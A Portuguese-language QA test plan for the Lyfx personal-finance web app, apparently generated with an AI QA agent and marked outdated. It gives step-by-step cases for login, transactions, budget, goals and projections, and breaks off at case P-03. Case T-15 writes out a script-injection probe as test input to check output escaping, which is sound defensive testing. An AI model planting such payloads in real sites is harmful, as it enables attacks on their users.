# Lyfx — Plano de Testes v1.5.0

> **⚠️ DESATUALIZADO — Este plano cobre até v1.5.0 (22/05/2026).**
> Módulos não cobertos: Reembolso Especial (CS-17), Central de Notificações (CS-18/CS-19), Studio G2 (v1.8.0).
> **Regenerar com Agent Smith antes do próximo ciclo de QA completo.** Usar como base para delta de v1.5.0 → v1.10.0.

> Casos de teste executáveis · Gerado em 22/05/2026
> Baseado em análise do Agent Smith (QA Specialist) · Myers · WAHH · Hendrickson · Kaner

**Como usar este arquivo:**
- Cada caso é autossuficiente: pré-condições + passos + resultado esperado preciso
- Executar na ordem das seções (Autenticação antes de tudo)
- Casos SEC e ISO requerem 2 usuários criados via Studio
- Marcar cada caso: ✅ PASSOU · ❌ FALHOU · ⏭ PULADO

**Ambiente:** `http://localhost:3000` · SQLite `dev.db` · Next.js 16
**Total de casos:** 222

---

## Índice

1. [Autenticação](#1-autenticação)
2. [Navegação](#2-navegação)
3. [Transações](#3-transações)
4. [Orçamento](#4-orçamento)
5. [Contas Fixas](#5-contas-fixas)
6. [Metas](#6-metas)
7. [Projeções](#7-projeções)
8. [Passivos](#8-passivos)
9. [Alertas](#9-alertas)
10. [Saúde Financeira](#10-saúde-financeira)
11. [Relatórios](#11-relatórios)
12. [Reembolsos](#12-reembolsos)
13. [Tags](#13-tags)
14. [Instituições](#14-instituições)
15. [Bens e Imóveis](#15-bens-e-imóveis)
16. [Educação](#16-educação)
17. [Perfil](#17-perfil)
18. [Studio](#18-studio)
19. [Fluxos Transversais End-to-End](#19-fluxos-transversais-end-to-end)
20. [Segurança](#20-segurança)
21. [Isolamento Multi-Usuário](#21-isolamento-multi-usuário)
22. [Componentes Transversais](#22-componentes-transversais)

---

## 1. Autenticação

### A-01 — Criar conta em modo setup
**Prioridade:** ALTO
**Pré-condições:** Banco sem nenhum usuário cadastrado (`dev.db` limpo ou Studio sem usuários)
**Passos:**
1. Acessar `http://localhost:3000/login`
2. Verificar que o formulário exibe 4 campos: Nome, E-mail, Senha, Confirmar senha
3. Preencher Nome: `Usuário Teste`
4. Preencher E-mail: `teste@lyfx.com`
5. Preencher Senha: `123456`
6. Preencher Confirmar senha: `123456`
7. Clicar no botão de criar conta
**Resultado esperado:** Usuário criado com sucesso. Redirecionamento para `/dashboard`. Cookie `lyfx_session` presente no navegador.

---

### A-02 — Fazer login com credenciais válidas
**Prioridade:** CRÍTICO
**Pré-condições:** 1 usuário cadastrado com e-mail `teste@lyfx.com` e senha `123456`
**Passos:**
1. Acessar `/login`
2. Preencher E-mail: `teste@lyfx.com`
3. Preencher Senha: `123456`
4. Clicar em "Entrar"
**Resultado esperado:** Botão muda para verde com ícone de confirmação por ~1s, depois redireciona para `/dashboard`.

---

### A-03 — Tentar login com senha incorreta
**Prioridade:** ALTO
**Pré-condições:** 1 usuário cadastrado com senha `123456`
**Passos:**
1. Acessar `/login`
2. Preencher E-mail: `teste@lyfx.com`
3. Preencher Senha: `senhaerrada`
4. Clicar em "Entrar"
**Resultado esperado:** Mensagem de erro visível na tela (ex: "Credenciais inválidas" ou equivalente). Usuário permanece em `/login`. Nenhum redirecionamento.

---

### A-04 — Tentar login com e-mail inexistente
**Prioridade:** ALTO
**Pré-condições:** 1 usuário cadastrado com e-mail `teste@lyfx.com`
**Passos:**
1. Acessar `/login`
2. Preencher E-mail: `naoexiste@lyfx.com`
3. Preencher Senha: `qualquer123`
4. Clicar em "Entrar"
**Resultado esperado:** A mensagem de erro deve ser **idêntica** à exibida em A-03 (senha incorreta). Não deve revelar se o e-mail existe ou não no banco (proteção contra username enumeration — WAHH cap. 6).

---

### A-05 — Tentar criar conta com senhas divergentes
**Prioridade:** ALTO
**Pré-condições:** Banco sem usuários (modo setup)
**Passos:**
1. Acessar `/login`
2. Preencher Nome: `Teste`
3. Preencher E-mail: `teste@lyfx.com`
4. Preencher Senha: `123456`
5. Preencher Confirmar senha: `654321`
6. Clicar em criar conta
**Resultado esperado:** Botão executa animação de "shake" (tremida). Mensagem informando que as senhas não coincidem. Conta não criada.

---

### A-06 — Tentar criar conta com senha menor que 6 caracteres
**Prioridade:** ALTO
**Pré-condições:** Banco sem usuários
**Passos:**
1. Acessar `/login`
2. Preencher todos os campos com senha `12345` (5 caracteres)
3. Clicar em criar conta
**Resultado esperado:** Erro indicando que a senha deve ter no mínimo 6 caracteres. Conta não criada.

---

### A-07 — Tentar criar conta com campo Nome em branco
**Prioridade:** MÉDIO
**Pré-condições:** Banco sem usuários
**Passos:**
1. Acessar `/login` em modo setup
2. Deixar o campo Nome vazio
3. Preencher E-mail, Senha e Confirmação válidos
4. Clicar em criar conta
**Resultado esperado:** Erro indicando que o nome é obrigatório. Conta não criada.

---

### A-08 — Tentar criar conta com campo E-mail em branco
**Prioridade:** MÉDIO
**Pré-condições:** Banco sem usuários
**Passos:**
1. Acessar `/login` em modo setup
2. Deixar o campo E-mail vazio
3. Preencher Nome, Senha e Confirmação válidos
4. Clicar em criar conta
**Resultado esperado:** Erro indicando que o e-mail é obrigatório. Conta não criada.

---

### A-09 — Tentar criar conta com e-mail em formato inválido
**Prioridade:** ALTO
**Pré-condições:** Banco sem usuários
**Passos:**
1. Acessar `/login` em modo setup
2. Preencher E-mail com: `emailsemarroba` (sem @)
3. Preencher demais campos corretamente
4. Clicar em criar conta
**Resultado esperado:** Erro indicando e-mail inválido. Conta não criada. Repetir com `email@` (sem domínio) e `@dominio.com` (sem usuário) — todos devem falhar.

---

### A-10 — Tentar criar conta com e-mail já existente
**Prioridade:** ALTO
**Pré-condições:** Usuário com e-mail `teste@lyfx.com` já cadastrado
**Passos:**
1. Acessar `/login`
2. Alternar para modo setup (se disponível)
3. Preencher E-mail: `teste@lyfx.com` (mesmo e-mail existente)
4. Preencher demais campos válidos
5. Clicar em criar conta
**Resultado esperado:** Erro indicando que o e-mail já está em uso. Segunda conta não criada.

---

### A-11 — Alternar entre modo login e modo setup
**Prioridade:** BAIXO
**Pré-condições:** 1 usuário cadastrado
**Passos:**
1. Acessar `/login` (exibe modo login por padrão)
2. Clicar no link para alternar para modo setup
3. Verificar que os campos de Nome e Confirmar senha aparecem
4. Clicar novamente para voltar ao modo login
**Resultado esperado:** Alternância funciona sem recarregar a página. Campos somem e aparecem corretamente.

---

### A-12 — Abrir e fechar modal "Esqueci minha senha"
**Prioridade:** BAIXO
**Pré-condições:** Nenhuma
**Passos:**
1. Acessar `/login`
2. Clicar em "Esqueci minha senha"
3. Verificar conteúdo do modal
4. Fechar o modal
**Resultado esperado:** Modal abre com orientação para acessar perfil ou contatar administrador. Fecha ao clicar no botão de fechar ou fora do modal.

---

### A-13 — Clicar em "← Início"
**Prioridade:** BAIXO
**Pré-condições:** Nenhuma
**Passos:**
1. Acessar `/login`
2. Clicar em "← Início"
**Resultado esperado:** Redirecionamento para `/` (landing page).

---

### A-14 — Fazer logout via menu do usuário
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado
**Passos:**
1. Clicar no menu do usuário (canto superior direito)
2. Clicar em "Sair"
**Resultado esperado:** Cookie `lyfx_session` removido. Redirecionamento para `/`. Tentar acessar `/dashboard` redireciona para `/login`.

---

### A-15 — Tentar acessar rota protegida sem sessão
**Prioridade:** CRÍTICO
**Pré-condições:** Nenhum cookie de sessão ativo
**Passos:**
1. Sem estar logado, acessar diretamente `http://localhost:3000/dashboard`
**Resultado esperado:** Redirecionamento imediato para `/login`. Página do dashboard não é renderizada.

---

### A-16 — Acessar `/` com sessão ativa
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado com sessão ativa
**Passos:**
1. Acessar `http://localhost:3000/`
**Resultado esperado:** Redirecionamento automático para `/dashboard`. Landing page não é exibida.

---

### A-17 — Sessão persiste com "Lembrar de mim"
**Prioridade:** ALTO
**Pré-condições:** 1 usuário cadastrado
**Passos:**
1. Acessar `/login`
2. Marcar a opção "Lembrar de mim"
3. Fazer login com credenciais válidas
4. Fechar completamente o navegador
5. Reabrir o navegador e acessar `http://localhost:3000/dashboard`
**Resultado esperado:** Usuário ainda está logado. Dashboard carrega sem pedir login novamente.

---

### A-18 — Redirect preserva rota original após login
**Prioridade:** MÉDIO
**Pré-condições:** Nenhuma sessão ativa
**Passos:**
1. Sem estar logado, tentar acessar `http://localhost:3000/health`
2. Ser redirecionado para `/login`
3. Fazer login com credenciais válidas
**Resultado esperado:** Após login, redireciona para `/health` (rota originalmente solicitada) e não para `/dashboard`.

---

### A-19 — Senha com caracteres especiais
**Prioridade:** MÉDIO
**Pré-condições:** Banco sem usuários
**Passos:**
1. Criar conta com senha: `P@$$w0rd!<>&"'`
2. Fazer logout
3. Fazer login com a mesma senha
**Resultado esperado:** Conta criada e login bem-sucedido. Caracteres especiais na senha são tratados corretamente.

---

## 2. Navegação

### N-01 — Colapsar e expandir a sidebar
**Prioridade:** BAIXO
**Pré-condições:** Usuário logado em qualquer página
**Passos:**
1. Verificar sidebar expandida (220px) com ícones e labels visíveis
2. Clicar no logo do Lyfx na sidebar para colapsar
3. Verificar sidebar colapsada (60px) com apenas ícones
4. Verificar posição do conteúdo principal
5. Clicar novamente no logo para expandir
**Resultado esperado:** Sidebar alterna entre 220px (expandida) e 60px (colapsada). O conteúdo principal desloca para a esquerda ao colapsar e para a direita ao expandir — acompanhando a variável CSS `--sidebar-width` — sem permanecer centralizado. Transição de 200ms sem salto visual.

---

### N-02 — Tooltip na sidebar colapsada
**Prioridade:** BAIXO
**Pré-condições:** Sidebar colapsada
**Passos:**
1. Passar o mouse sobre um ícone da sidebar colapsada
**Resultado esperado:** Tooltip com o nome do módulo aparece ao lado do ícone.

---

### N-03 — Highlight da rota ativa
**Prioridade:** BAIXO
**Pré-condições:** Usuário em `/dashboard`
**Passos:**
1. Verificar qual item da sidebar está destacado
2. Navegar para `/transactions`
3. Verificar qual item está destacado agora
**Resultado esperado:** Apenas o item correspondente à rota atual fica destacado em cyan. O item anterior perde o destaque.

---

### N-04 — Abrir menu do usuário
**Prioridade:** BAIXO
**Pré-condições:** Usuário logado
**Passos:**
1. Clicar na pílula de usuário (canto superior direito)
**Resultado esperado:** Dropdown aparece com nome completo, link "Editar perfil" e botão "Sair".

---

### N-05 — Fechar menu do usuário clicando fora
**Prioridade:** BAIXO
**Pré-condições:** Menu do usuário aberto
**Passos:**
1. Clicar em qualquer área fora do dropdown do menu
**Resultado esperado:** Dropdown fecha sem navegar para nenhuma página.

---

### N-06 — Navegar para perfil via menu do usuário
**Prioridade:** BAIXO
**Pré-condições:** Usuário logado
**Passos:**
1. Abrir menu do usuário
2. Clicar em "Editar perfil"
**Resultado esperado:** Navegação para `/profile`.

---

## 3. Transações

### T-01 — Criar transação avulsa de crédito
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado, em `/transactions`
**Passos:**
1. Abrir formulário de nova transação
2. Tipo: Crédito
3. Data: dia atual
4. Descrição: `Salário maio`
5. Valor: `6000`
6. Categoria: `Receita fixa`
7. Clicar em salvar
**Resultado esperado:** Transação aparece na lista do mês atual com valor `R$ 6.000,00` em verde. Dashboard atualiza KPI de Receita.

---

### T-02 — Criar transação avulsa de débito
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado, em `/transactions`
**Passos:**
1. Abrir formulário de nova transação
2. Tipo: Débito
3. Data: dia atual
4. Descrição: `Aluguel`
5. Valor: `1800`
6. Categoria: `Despesa fixa`
7. Clicar em salvar
**Resultado esperado:** Transação aparece na lista com valor `R$ 1.800,00` em vermelho. Dashboard atualiza KPI de Gastos.

---

### T-03 — Criar transação com recorrência mensal
**Prioridade:** ALTO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação de débito, valor `R$ 55,90`, descrição `Netflix`
2. Selecionar recorrência: "Todo mês"
3. Salvar
**Resultado esperado:** Transação criada. Aparece em `/fixed-expenses` na lista de fixos mensais.

---

### T-04 — Criar transação com recorrência mensal e data de encerramento
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação mensal com descrição `Parcela contrato`
2. Definir data de encerramento: 3 meses à frente do mês atual
3. Salvar
**Resultado esperado:** Transação criada. Em `/projections`, aparece apenas nos 3 meses até o encerramento, não além.

---

### T-05 — Criar transação com recorrência anual
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação de débito, valor `R$ 1.240,00`, descrição `IPVA`
2. Selecionar recorrência: "Todo ano"
3. Salvar
**Resultado esperado:** Transação criada. Aparece em `/fixed-expenses` na lista de anuais com badge do mês. Aparece como pico no gráfico de projeção 12 meses.

---

### T-06 — Criar transação com tag associada
**Prioridade:** MÉDIO
**Pré-condições:** Pelo menos 1 tag cadastrada (ex: "Carro")
**Passos:**
1. Criar transação de débito
2. No campo Tags, selecionar a tag "Carro"
3. Salvar
**Resultado esperado:** Transação listada com o chip da tag "Carro" visível na lista.

---

### T-07 — Criar transação com múltiplas tags
**Prioridade:** MÉDIO
**Pré-condições:** 3 tags cadastradas
**Passos:**
1. Criar transação de débito
2. Associar 3 tags diferentes
3. Salvar
**Resultado esperado:** Transação exibe os 3 chips de tags na listagem.

---

### T-08 — Criar transação reembolsável
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação de débito, valor `R$ 350,00`, descrição `Hotel viagem trabalho`
2. Ativar toggle "Despesa reembolsável"
3. Salvar
**Resultado esperado:** Transação aparece em `/transactions` normalmente. Também aparece em `/reimbursements` na lista "Aguardando reembolso".

---

### T-09 — Criar parcelamento (3 parcelas)
**Prioridade:** ALTO
**Pré-condições:** Usuário logado
**Passos:**
1. Abrir formulário, selecionar aba "Parcelamento"
2. Descrição: `Notebook`, Valor total: `R$ 3.600,00`, Parcelas: `3`
3. Data início: 1º do mês atual
4. Salvar
**Resultado esperado:** 3 transações criadas: `Notebook (1/3)`, `Notebook (2/3)`, `Notebook (3/3)` com R$ 1.200,00 cada, em meses consecutivos.

---

### T-10 — Parcelamento com valor não divisível exatamente
**Prioridade:** ALTO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar parcelamento: valor `R$ 100,00` em `3` parcelas
2. Salvar
**Resultado esperado:** Parcela (1/3) = R$ 33,33, Parcela (2/3) = R$ 33,33, Parcela (3/3) = R$ 33,34. Soma exata = R$ 100,00.

---

### T-11 — Parcelamento com 1 parcela (BVA mínimo)
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar parcelamento com `1` parcela, valor `R$ 500,00`
2. Salvar
**Resultado esperado:** 1 transação criada: `Descrição (1/1)`, valor R$ 500,00. Sem comportamento inesperado.

---

### T-12 — Criar transação com valor zero
**Prioridade:** ALTO
**Pré-condições:** Usuário logado
**Passos:**
1. Tentar criar transação com valor `0` ou `0,00`
2. Clicar em salvar
**Resultado esperado:** Sistema bloqueia com mensagem "Valor deve ser maior que zero" (ou equivalente). Transação não criada.

---

### T-13 — Criar transação com valor negativo
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado
**Passos:**
1. Tentar inserir valor `-1500` no campo de valor
2. Tentar salvar
**Resultado esperado:** Campo não aceita valor negativo (bloqueio no input ou validação ao salvar). Transação não criada com valor negativo.

---

### T-14 — Criar transação com valor extremamente alto
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Inserir valor `999999999.99` (R$ 999.999.999,99)
2. Salvar
**Resultado esperado:** Transação criada. Valor exibido corretamente formatado. Dashboard e DRE exibem o valor sem overflow visual ou erro de formatação.

---

### T-15 — Criar transação com descrição contendo HTML
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação com descrição: `<script>alert('xss')</script>`
2. Salvar
3. Verificar a transação na listagem
**Resultado esperado:** Texto exibido literalmente como `<script>alert('xss')</script>` — nenhum alerta JavaScript é executado. O conteúdo é escapado na renderização.

---

### T-16 — Criar transação com aspas na descrição
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação com descrição: `Pagamento "João" & 'Maria'`
2. Salvar e visualizar
**Resultado esperado:** Descrição exibida exatamente como digitada, com aspas e &. Sem quebra de layout.

---

### T-17 — Navegar entre meses na listagem
**Prioridade:** ALTO
**Pré-condições:** Transações em pelo menos 2 meses diferentes
**Passos:**
1. Em `/transactions`, verificar transações do mês atual
2. Navegar para o mês anterior
3. Navegar de volta para o mês atual
**Resultado esperado:** Cada mês exibe apenas suas próprias transações. Navegação entre meses funciona sem recarregar a página.

---

### T-18 — Clicar em transação para abrir ActionBar
**Prioridade:** MÉDIO
**Pré-condições:** Pelo menos 1 transação no mês
**Passos:**
1. Clicar em uma transação na lista
**Resultado esperado:** ActionBar desliza para baixo com botões "Editar" (âmbar) e "Excluir" (vermelho).

---

### T-19 — Fechar ActionBar com ×
**Prioridade:** BAIXO
**Pré-condições:** ActionBar aberta
**Passos:**
1. Clicar no botão × da ActionBar
**Resultado esperado:** ActionBar fecha sem executar nenhuma ação.

---

### T-20 — Editar transação avulsa (modo single)
**Prioridade:** ALTO
**Pré-condições:** Transação avulsa criada
**Passos:**
1. Clicar na transação → Editar
2. Alterar o valor de `R$ 1.800,00` para `R$ 1.900,00`
3. Salvar
**Resultado esperado:** Transação atualizada com novo valor. Lista reflete imediatamente. Dashboard e DRE atualizam.

---

### T-21 — Editar parcela de parcelamento (modo installment)
**Prioridade:** ALTO
**Pré-condições:** Parcelamento de 3x criado, pelo menos 1 parcela futura
**Passos:**
1. Clicar na parcela (1/3) → Editar
2. Alterar a descrição para `Notebook Pro`
3. Salvar
**Resultado esperado:** A parcela clicada e todas as parcelas futuras do grupo são atualizadas com a nova descrição. Parcelas passadas permanecem inalteradas. O campo de data não está disponível no modal.

---

### T-22 — Excluir transação individual
**Prioridade:** ALTO
**Pré-condições:** Pelo menos 1 transação avulsa
**Passos:**
1. Clicar na transação → Excluir
2. Confirmar a exclusão
**Resultado esperado:** Transação removida da lista. Não aparece mais no DRE ou KPIs.

---

### T-23 — Excluir grupo de parcelas
**Prioridade:** ALTO
**Pré-condições:** Parcelamento de 3x criado
**Passos:**
1. Clicar em qualquer parcela do grupo → ActionBar
2. Clicar em "Excluir grupo" (opção de excluir todas as parcelas)
3. Confirmar
**Resultado esperado:** Todas as 3 parcelas removidas. Nenhuma parcela do grupo permanece na listagem ou nas projeções.

---

### T-24 — Transação recorrente aparece nos meses futuros
**Prioridade:** ALTO
**Pré-condições:** Transação mensal criada no mês atual
**Passos:**
1. Criar transação com recorrência "Todo mês", sem data de encerramento
2. Navegar para `/projections`
3. Verificar os próximos 12 meses
**Resultado esperado:** A transação aparece em todos os 12 meses projetados com o mesmo valor.

---

### T-25 — Data no futuro distante
**Prioridade:** BAIXO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar transação avulsa com data: `01/01/2050`
2. Salvar
**Resultado esperado:** Transação criada sem erro. Aparece no mês/ano correto ao navegar para janeiro/2050.

---

## 4. Orçamento

### O-01 — Definir receita esperada
**Prioridade:** ALTO
**Pré-condições:** Usuário logado, em `/budget`, sem receita esperada definida
**Passos:**
1. Localizar campo de receita esperada
2. Inserir valor `6000`
3. Salvar/confirmar
**Resultado esperado:** Valor salvo. Exibido como `R$ 6.000,00`. Percentuais de alocação passam a usar esse valor como referência.

---

### O-02 — Definir receita esperada como zero
**Prioridade:** CRÍTICO
**Pré-condições:** Usuário logado em `/budget`
**Passos:**
1. Definir receita esperada como `0`
2. Definir alocação de R$ 500 para alguma categoria
3. Verificar o percentual exibido
**Resultado esperado:** Sistema não faz divisão por zero. Exibe `--` ou `0%` no lugar do percentual, sem erro ou `NaN` na tela.

---

### O-03 — Definir alocação para uma categoria
**Prioridade:** ALTO
**Pré-condições:** Receita esperada definida como `R$ 6.000,00`
**Passos:**
1. Localizar a categoria "Despesa variável"
2. Inserir alocação: `800`
3. Salvar
**Resultado esperado:** Alocação salva. Percentual exibido como `13,3%` (800/6000). Barra de progresso aparece.

---

### O-04 — Verificar barra de progresso verde (< 75%)
**Prioridade:** MÉDIO
**Pré-condições:** Alocação de R$ 800 para "Despesa variável". Gasto real de R$ 400 nessa categoria no mês.
**Passos:**
1. Verificar a barra de progresso da categoria "Despesa variável"
**Resultado esperado:** Barra verde em 50% (400/800). Badge "R$ 400 / R$ 800".

---

### O-05 — Verificar barra de progresso âmbar (75–99%)
**Prioridade:** MÉDIO
**Pré-condições:** Alocação de R$ 800. Gasto real de R$ 650.
**Passos:**
1. Verificar barra de progresso da categoria
**Resultado esperado:** Barra âmbar em ~81%. Indicação visual de atenção.

---

### O-06 — Verificar barra de progresso vermelha (≥ 100%)
**Prioridade:** ALTO
**Pré-condições:** Alocação de R$ 800. Gasto real de R$ 900.
**Passos:**
1. Verificar barra de progresso da categoria
**Resultado esperado:** Barra vermelha em 100% (trava no limite visual). Badge indica estouro.

---

### O-07 — Alocação maior que receita esperada
**Prioridade:** ALTO
**Pré-condições:** Receita esperada de R$ 6.000
**Passos:**
1. Definir alocação de R$ 10.000 para uma categoria
2. Verificar o percentual e o balanço planejado
**Resultado esperado:** Sistema aceita ou bloqueia (documentar comportamento). Se aceitar: percentual exibe `166,7%`. Balanço planejado mostra valor negativo (R$ -4.000). Sem crash.

---

### O-08 — Categoria com gastos mas sem alocação
**Prioridade:** MÉDIO
**Pré-condições:** Transação de R$ 300 em "Despesa imprevisível" sem alocação definida para essa categoria
**Passos:**
1. Verificar a categoria "Despesa imprevisível" em `/budget`
**Resultado esperado:** Categoria exibe o gasto real de R$ 300 sem barra de progresso ou com indicação "sem limite definido". Sem crash.

---

### O-09 — Navegar para mês anterior e verificar gasto real
**Prioridade:** MÉDIO
**Pré-condições:** Transações em 2 meses diferentes
**Passos:**
1. Em `/budget`, navegar para o mês anterior
**Resultado esperado:** Gastos reais mudam para refletir o mês selecionado. As alocações planejadas permanecem as mesmas (únicas para todos os meses).

---

### O-10 — Mês sem nenhuma transação
**Prioridade:** MÉDIO
**Pré-condições:** Navegar para um mês sem transações
**Passos:**
1. Navegar para um mês futuro sem transações registradas
**Resultado esperado:** Todas as barras de progresso em 0%. Nenhum percentual exibe `NaN` ou erro. Balanço real = R$ 0,00.

---

### O-11 — Verificar balanço planejado vs real
**Prioridade:** MÉDIO
**Pré-condições:** Receita esperada R$ 6.000, alocações totalizando R$ 4.000, gasto real R$ 3.500
**Passos:**
1. Verificar card de balanço em `/budget`
**Resultado esperado:** Planejado = R$ 2.000 (6.000 − 4.000). Real = R$ 2.500 (6.000 − 3.500).

---

## 5. Contas Fixas

### F-01 — Verificar cards de resumo
**Prioridade:** MÉDIO
**Pré-condições:** Pelo menos 1 transação mensal e 1 anual cadastradas
**Passos:**
1. Acessar `/fixed-expenses`
2. Verificar os 3 cards: "Total mensal", "Total anual eventual", "Projeção 12 meses"
**Resultado esperado:** Valores corretos: total mensal = soma das mensais, total anual = soma das anuais, projeção 12 meses = (mensal × 12) + total anuais.

---

### F-02 — Verificar lista de fixos mensais
**Prioridade:** MÉDIO
**Pré-condições:** Pelo menos 2 transações mensais
**Passos:**
1. Verificar lista de fixos mensais em `/fixed-expenses`
**Resultado esperado:** Todas as transações com recorrência mensal aparecem, ordenadas por valor decrescente.

---

### F-03 — Verificar fixos anuais com badge de mês
**Prioridade:** MÉDIO
**Pré-condições:** Pelo menos 1 transação anual
**Passos:**
1. Verificar lista de fixos anuais
**Resultado esperado:** Cada item exibe um badge com o mês em que ocorre (ex: "Abril" para IPVA em abril).

---

### F-04 — Verificar gráfico de projeção 12 meses
**Prioridade:** MÉDIO
**Pré-condições:** Transações mensais e anuais cadastradas
**Passos:**
1. Verificar o gráfico de barras horizontais
**Resultado esperado:** Barras vermelhas para a base mensal. Picos amarelos nos meses com despesas anuais adicionais.

---

### F-05 — Verificar provisão sazonal com urgência vermelha
**Prioridade:** MÉDIO
**Pré-condições:** Despesa anual com vencimento em ≤ 2 meses
**Passos:**
1. Verificar seção de Provisão Sazonal
**Resultado esperado:** Item exibido com badge vermelho "Urgente". Valor a provisionar = valor total ÷ meses restantes (ex: R$ 1.200 ÷ 2 = R$ 600/mês).

---

### F-06 — Verificar cálculo de provisão sazonal
**Prioridade:** MÉDIO
**Pré-condições:** Despesa anual de R$ 1.200 com vencimento em 6 meses
**Passos:**
1. Verificar valor mensal a provisionar para essa despesa
**Resultado esperado:** `R$ 200,00/mês` (1.200 ÷ 6). Não usa divisor fixo de 12.

---

## 6. Metas

### M-01 — Criar meta com cálculo em tempo real
**Prioridade:** ALTO
**Pré-condições:** Usuário logado, em `/goals`
**Passos:**
1. Abrir formulário de nova meta
2. Nome: `Reserva de Emergência`
3. Valor alvo: `12000`
4. Prazo: 12 meses à frente
5. Verificar o valor calculado por mês em tempo real
**Resultado esperado:** Sistema exibe `R$ 1.000,00/mês` enquanto o usuário preenche.

---

### M-02 — Meta com prazo no passado
**Prioridade:** ALTO
**Pré-condições:** Usuário logado
**Passos:**
1. Tentar criar meta com prazo no mês anterior ao atual
2. Clicar em salvar
**Resultado esperado:** Sistema bloqueia com mensagem indicando que o prazo deve ser uma data futura. Meta não criada.

---

### M-03 — Meta com prazo no mês atual (1 cobrança)
**Prioridade:** MÉDIO
**Pré-condições:** Usuário logado
**Passos:**
1. Criar meta com prazo = mês atual, valor = R$ 500,00
2. Salvar
**Resultado esperado:** 1 cobrança gerada para o mês atual de R$ 500,00.

---

### M-04 — Verificar classificação "Cabe folgado"
**Prioridade:** MÉDIO
**Pré-condições:** Média de sobra dos últimos 3 meses = R$ 2.000. Criar meta com cobrança mensal de R$ 400 (20% da sobra).
**Passos:**
1. Criar meta com cobrança que corresponda a ≤ 30% da sobra média
2. Verificar a classificação exibida
**Resultado esperado:** Badge verde "Cabe folgado".

---

### M-05 — Verificar classificação "Factível"
**Prioridade:** MÉDIO
**Pré-condições:** Sobra média = R$ 2.000. Cobrança mensal = R$ 800 (40% da sobra).
**Passos:**
1. Criar meta com cobrança entre 31% e 60% da sobra
**Resultado esperado:** Badge "Factível".

---

### M-06 — Verificar classificação "Apertado"
**Prioridade:** MÉDIO
**Pré-condições:** Sobra média = R$ 2.000. Cobrança mensal = R$ 1.500 (75% da sobra).
**Passos:**
1. Criar meta com cobrança entre 61% e 100% da sobra
**Resultado esperado:** Badge âmbar "Apertado — considere estender o prazo".

---

### M-07 — Verificar classificação "Inviável"
**Prioridade:** MÉDIO
**Pré-condições:** Sobra média = R$ 2.000. Cobrança mensal = R$ 2.500 (125% da sobra).
**Passos:**
1. Criar meta com cobrança > sobra média
**Resultado esperado:** Badge vermelho "Inviável — você precisaria de R$ 500,00/mês a mais".

---

### M-08 — Usuário sem histórico de 3 meses (denominador zero)
**Prioridade:** ALTO
**Pré-condições:** Usuário novo sem transações nos últimos 3 meses
**Passos:**
1. Tentar criar uma meta
2. Verificar a classificação de viabilidade
**Resultado esperado:** Sistema não divide por zero. Exibe "Sem histórico suficiente para calcular viabilidade" ou assume cobrança viável sem crash.

---

### M-09 — Marcar cobrança como paga
**Prioridade:** ALTO
**Pré-condições:** Meta criada com pelo menos 1 cobrança
**Passos:**
1. Localizar cobrança do mês atual
2. Clicar em "Marcar como paga"
**Resultado esperado:** Status da cobrança muda para paga (badge verde). `currentAmount` da meta aumenta pelo valor da cobrança. Barra de progresso atualiza.

---

### M-10 — Desmarcar cobrança paga
**Prioridade:** MÉDIO
**Pré-condições:** Cobrança marcada como paga
**Passos:**
1. Clicar em "Desmarcar" na cobrança paga
**Resultado esperado:** Cobrança volta para status pendente. `currentAmount` reduz. Barra de progresso diminui.

---

### M-11 — Conclusão automática quando acumulado ≥ alvo
**Prioridade:** ALTO
**Pré-condições:** Meta de R$ 1.000 em 2 meses (R$ 500/mês). 1ª cobrança paga.
**Passos:**
1. Marcar a 2ª cobrança (última) como paga
**Resultado esperado:** `currentAmount` = R$ 1.000 = `targetAmount`. Status da meta muda para "Concluída". Card de meta exibe indicação visual de conclusão.

---

### M-12 — Cobrança em atraso
**Prioridade:** MÉDIO
**Pré-condições:** Meta com cobrança vencida no mês passado e não paga
**Passos:**
1. Verificar a cobrança vencida na lista da meta
**Resultado esperado:** Badge vermelho "Em atraso" na cobrança. Alerta correspondente em `/alerts`.

---

### M-13 — Excluir meta
**Prioridade:** MÉDIO
**Pré-condições:** Meta com cobranças (algumas pagas, outras pendentes)
**Passos:**
1. Localizar botão de exclusão da meta
2. Confirmar exclusão
**Resultado esperado:** Meta removida. Todas as cobranças associadas (`GoalPayment`) também removidas. Widget de metas no dashboard não exibe mais a meta.

---

### M-14 — Banner de alerta de passivos ≥ 5% a.m.
**Prioridade:** MÉDIO
**Pré-condições:** Passivo cadastrado com taxa de `8% a.m.`
**Passos:**
1. Acessar `/goals`
2. Verificar banner no topo da página
**Resultado esperado:** Banner vermelho listando os passivos de alto custo e sugerindo priorizar quitação antes de acumular metas.

---

### M-15 — Widget de metas no dashboard
**Prioridade:** MÉDIO
**Pré-condições:** Pelo menos 1 meta ativa com progresso parcial
**Passos:**
1. Acessar `/dashboard`
2. Verificar o widget de metas
**Resultado esperado:** Widget exibe barra de progresso da meta com `currentAmount / targetAmount` e percentual correto.

---

## 7. Projeções

### P-01 — Verificar cards de resumo
**Prioridade:** MÉDIO
**Pré-condições:** Recorrências cadastradas
**Passos:**
1. Acessar `/projections`
2. Verificar "Livre acumulado", "Média mensal livre" e "Meses no vermelho"
**Resultado esperado:** Valores calculados corretamente com base nas recorrências ativas.

---

### P-02 — Clicar em mês do gráfico e ver detalhe
**Prioridade:** MÉDIO
**Pré-condições:** Recorrências cadastradas
**Passos:**
1. Clicar em qualquer coluna do gráfico de 12 meses
**Resultado esperado:** Painel de detalhe aparece abaixo com breakdown de entradas e saídas daquele mês. Badge "Anual" em lançamentos anuais.

---

### P-03 — Recorrência encerrada não aparece após o fim
**Prioridade:** ALTO
